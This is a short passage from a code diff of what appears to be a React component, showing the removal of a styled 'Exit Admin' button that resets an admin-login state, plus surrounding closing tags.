-                  <button type="button" onClick={() => setIsAdminLoggedIn(false)} style={{ flex: 1, padding: '9px', background: '#fee2e2', color: '#b91c1c', border: 'none', borderRadius: '8px', fontSize: '12px', fontWeight: 800, cursor: 'pointer' }}>
-                    Exit Admin
-                  </button>
-                </div>
-              </div>
-            )}
           </div>
         </div>
       )}
